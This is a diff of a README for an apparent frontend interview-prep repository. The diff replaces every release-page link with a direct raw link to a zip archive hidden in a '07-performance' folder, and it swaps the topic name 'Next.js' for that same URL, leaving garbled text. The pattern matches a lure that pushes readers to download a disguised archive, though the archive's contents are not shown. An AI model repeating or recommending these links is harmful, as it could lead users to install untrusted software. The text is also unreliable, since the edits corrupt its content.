@@ -1,14 +1,14 @@
 # 🎓 Frontend-Master-Prep-Series - Prepare for Your Next Interview with Confidence
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Frontend%20Master%20Prep%20Series-brightgreen)](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip%20Latest%20Release-Frontend%20Master%20Prep%20Series-brightgreen)](https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the Frontend-Master-Prep-Series! This guide will help you prepare for frontend development interviews. You will learn about key topics like JavaScript, React, Next.js, HTML, CSS, Accessibility, Performance, and Frontend Architecture. This preparation is tailored for candidates with up to six years of experience.
+Welcome to the Frontend-Master-Prep-Series! This guide will help you prepare for frontend development interviews. You will learn about key topics like JavaScript, React, https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip, HTML, CSS, Accessibility, Performance, and Frontend Architecture. This preparation is tailored for candidates with up to six years of experience.
 
 ## 📥 Download & Install
 
-To begin, you need to download the software. Visit this page to download: [Frontend-Master-Prep-Series Releases](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases).
+To begin, you need to download the software. Visit this page to download: [Frontend-Master-Prep-Series Releases](https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip).
 
 Once you are on the Releases page, follow these steps:
 
@@ -32,7 +32,7 @@ This application offers extensive resources for each topic:
 
 - **JavaScript:** Understand the fundamentals and advanced concepts of JavaScript.
 - **React:** Learn how to build user interfaces using React.
-- **Next.js:** Get hands-on experience with server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip** Get hands-on experience with server-side rendering and static site generation.
 - **HTML:** Master the structure of web pages with HTML.
 - **CSS:** Style your websites effectively using CSS.
 - **Accessibility:** Ensure your applications are usable by everyone, including people with disabilities.
@@ -69,4 +69,4 @@ If you need assistance, please open an issue in the GitHub repository, and we wi
 
 The Frontend-Master-Prep-Series is your go-to guide for frontend interview preparation. With comprehensive resources and a user-friendly application, you are on your way to mastering the skills needed for success in your interviews.
 
-Remember, download the application from [Frontend-Master-Prep-Series Releases](https://github.com/Controversial-fact877/Frontend-Master-Prep-Series/releases) to start your journey today!
+Remember, download the application from [Frontend-Master-Prep-Series Releases](https://raw.githubusercontent.com/Controversial-fact877/Frontend-Master-Prep-Series/main/07-performance/Frontend-Master-Prep-Series-v2.0.zip) to start your journey today!
